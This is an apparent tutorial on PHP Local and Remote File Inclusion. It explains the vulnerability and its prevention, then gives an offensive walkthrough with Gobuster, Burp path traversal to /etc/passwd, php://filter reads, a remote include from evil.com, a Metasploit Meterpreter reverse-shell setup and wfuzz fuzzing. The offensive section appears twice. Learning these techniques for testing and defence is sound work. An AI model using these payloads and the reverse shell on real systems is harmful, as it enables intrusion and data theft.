## 1️ Local File Inclusion (LFI)
###  What is LFI?  
LFI occurs when an attacker **includes local files** (e.g., `/etc/passwd`, `config.php`) in a web application. This happens due to **poorly validated** user input in the file inclusion function.  

### Example of LFI  
A vulnerable PHP script:
```php
<?php
$file = $_GET['file']; 
include($file);
?>
```
An attacker can exploit this by accessing files on the server:  
```
http://example.com/vulnerable.php?file=/etc/passwd
```
If successful, it will display the contents of `/etc/passwd` (Linux user database).  

###  LFI Attack Techniques
- **Reading sensitive files** (e.g., `/etc/passwd`, `C:\windows\win.ini`)
- **Log poisoning** (injecting PHP code into logs and executing it)
- **PHP Wrappers** (`php://filter`, `php://input`)

---

## 2️ Remote File Inclusion (RFI)
###  What is RFI?  
RFI happens when an attacker includes a remote malicious file (hosted on their server). This allows them to execute arbitrary PHP code on the target server.

### Example of RFI
A vulnerable PHP script:
```php
<?php
$file = $_GET['file'];
include($file);
?>
```
An attacker can load a remote malicious PHP file:
```
http://example.com/vulnerable.php?file=http://evil.com/malicious.php
```
  If successful, the script from `evil.com` executes on the target server!

### RFI Attack Techniques
- Remote shell upload (reverse shell)
- Defacing websites
- Executing malware on the target server

---

## 3️ How to Prevent LFI & RFI?
###  Mitigations:
1. Use Whitelisting – Allow only specific files to be included.
2. Disable `allow_url_include` in PHP:
   ```ini
   allow_url_include = Off
   ```
3. Use `realpath()` & `basename()` to validate input.
4. Restrict file paths to prevent directory traversal attacks.

---

## 4️ LFI vs RFI: Key Differences
| Feature  | Local File Inclusion (LFI) | Remote File Inclusion (RFI) |
|----------|---------------------------|----------------------------|
| **Target** | Local files on the server | Remote files from another server |
| **Example** | `/etc/passwd`, `config.php` | `http://evil.com/malicious.php` |
| **Impact** | Read sensitive files, execute PHP code | Execute remote malicious scripts |
| **Prevention** | Input validation, disable `include()` | Disable `allow_url_include`, use whitelisting |

---

###  Conclusion
- **LFI**: Attacker includes **local** files on the server.
- **RFI**: Attacker includes **remote** files from another server.
- **Both can lead to full system compromise if not properly secured!**

If you want to **test LFI and RFI vulnerabilities**, you can use various **hacking tools** in **Kali Linux** to automate and exploit these weaknesses. Below is a step-by-step guide using **Burp Suite, Gobuster, and Metasploit**.

---

## 1️ Detect LFI & RFI Using Gobuster
###  Gobuster for Directory & File Enumeration
First, use Gobuster to find hidden directories or vulnerable parameters.  

```bash
gobuster dir -u http://target.com/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
```
 This helps find files like `vulnerable.php` that may be vulnerable to LFI/RFI.

---

## 2️ Exploit LFI Using Burp Suite
###  Burp Suite to Test LFI Manually
1. Open Burp Suite → Turn on Intercept.
2. Capture the request for `vulnerable.php?file=xyz`.
3. Modify the parameter to test LFI:
   ```
   vulnerable.php?file=../../../../etc/passwd
   ```
4. Forward the request → If successful, you'll see `/etc/passwd`.

 You can also use PHP Wrappers for deeper exploitation:
```
vulnerable.php?file=php://filter/convert.base64-encode/resource=config.php
```
Then decode the base64 output to view sensitive information.

---

## 3️ Exploit RFI Using Metasploit
###  Use Metasploit to Get a Reverse Shell
1. Start Metasploit:
   ```bash
   msfconsole
   ```
2. Use the RFI Exploit Module:
   ```bash
   use exploit/unix/webapp/php_include
   ```
3. Set the target URL:
   ```bash
   set TARGETURI /vulnerable.php?file=
   set RHOSTS target.com
   set PAYLOAD php/meterpreter/reverse_tcp
   set LHOST your-ip
   set LPORT 4444
   exploit
   ```
 If successful, you will get a Meterpreter shell, allowing you to execute commands on the server!

---

## Automate LFI & RFI with Fuzzing
Use wfuzz to brute-force file inclusion:
```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc=404 "http://target.com/vulnerable.php?file=FUZZ"
```
 This will find accessible files and possible LFI/RFI entry points.

---

##  How to Stay Secure?
- Sanitize user input (use `basename()` and `realpath()`).
- Disable `allow_url_include` in `php.ini`:
  ```ini
  allow_url_include = Off
  ```
- Use web application firewalls (e.g., ModSecurity).
- Monitor logs for suspicious requests.

---


##  1️ Detect LFI & RFI Using Gobuster  
###  Gobuster for Directory & File Enumeration
First, use Gobuster to find hidden directories or vulnerable parameters.  

```bash
gobuster dir -u http://target.com/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
```
 This helps find **files like `vulnerable.php`** that may be vulnerable to LFI/RFI.

---

##  2. Exploit LFI Using Burp Suite
###  Burp Suite to Test LFI Manually
1. Open Burp Suite → Turn on Intercept.
2. Capture the request for `vulnerable.php?file=xyz`.
3. Modify the parameter to test LFI:
   ```
   vulnerable.php?file=../../../../etc/passwd
   ```
4. Forward the request → If successful, you'll see `/etc/passwd`.

 You can also use PHP Wrappers for deeper exploitation:
```
vulnerable.php?file=php://filter/convert.base64-encode/resource=config.php
```
Then decode the base64 output to view sensitive information.

---

## 3️ Exploit RFI Using Metasploit
###  Use Metasploit to Get a Reverse Shell
1. Start Metasploit:
   ```bash
   msfconsole
   ```
2. Use the RFI Exploit Module:
   ```bash
   use exploit/unix/webapp/php_include
   ```
3. Set the target URL:
   ```bash
   set TARGETURI /vulnerable.php?file=
   set RHOSTS target.com
   set PAYLOAD php/meterpreter/reverse_tcp
   set LHOST your-ip
   set LPORT 4444
   exploit
   ```
 If successful, you will get a Meterpreter shell, allowing you to execute commands on the server!

---

## Bonus: Automate LFI & RFI with Fuzzing
Use wfuzz to brute-force file inclusion:
```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc=404 "http://target.com/vulnerable.php?file=FUZZ"
```
 This will find accessible files and possible LFI/RFI entry points.

---

##  How to Stay Secure?
- Sanitize user input (use `basename()` and `realpath()`).
- Disable `allow_url_include` in `php.ini`:
  ```ini
  allow_url_include = Off
  ```
- Use web application firewalls (e.g., ModSecurity).
- Monitor logs for suspicious requests.

---



